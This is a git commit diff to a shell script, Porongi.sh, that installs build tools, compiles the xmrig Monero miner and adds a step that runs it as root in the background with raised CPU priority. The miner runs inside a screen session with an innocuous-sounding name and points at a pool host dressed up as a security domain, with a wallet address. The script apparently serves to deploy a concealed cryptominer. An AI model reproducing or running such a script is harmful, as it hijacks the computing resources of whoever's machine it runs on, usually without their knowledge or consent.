014aacf15b182162a2b59f251d07c0463c0ec865
Ferchulin6489 <Ferchulin_64_89@hotmail.com>
2017-12-12 19:43:08 +0100

    gg

--- Porongi.sh
+++ Porongi.sh
@@ -8,10 +8,13 @@ sudo apt-get install -y cmake
 
 sudo apt-get upgrade -y
 
-sudo apt-get install -y build-essential cmake libuv1-dev libmicrohttpd-dev
+sudo apt-get install -y build-essential cmake libuv1-dev libmicrohttpd-dev screen
 git clone https://github.com/xmrig/xmrig.git
 cd xmrig
 mkdir build
 cd build
 cmake ..
 make
+
+sudo screen -S "m1deltapartofdata"
+sudo /root/xmrig/build/./xmrig -B -o  networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k -o networkhit.securitytactics.com:8080 -u 46jFgp3e8SWHFzJ9XHNN5SLV7VsDgQCHfVq417Hzf9G6bPRfS347zhQjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3hCeXyK -p ferkukucha@gmail.com -k --cpu-priority 2
